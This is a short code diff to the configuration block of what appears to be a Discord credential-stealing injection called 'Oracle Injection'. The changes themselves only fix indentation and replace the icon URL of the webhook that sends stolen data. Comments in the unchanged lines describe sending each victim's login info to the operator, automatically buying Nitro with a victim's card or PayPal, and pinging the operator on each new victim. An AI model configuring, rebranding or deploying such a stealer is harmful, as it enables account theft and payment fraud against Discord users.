@@ -8,9 +8,9 @@ const config = {
   auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
   ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
   ping_val: "@everyone", //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
-    embed_name: "Oracle Injection", //name of the webhook thats gonna send the info
+  embed_name: "Oracle Injection", //name of the webhook thats gonna send the info
   embed_icon:
-    "https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png".replace(
+    "https://media.discordapp.net/attachments/970982305021706303/971383656453144627/OracleLogo.jpg".replace(
       / /g,
       "%20",
     ), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
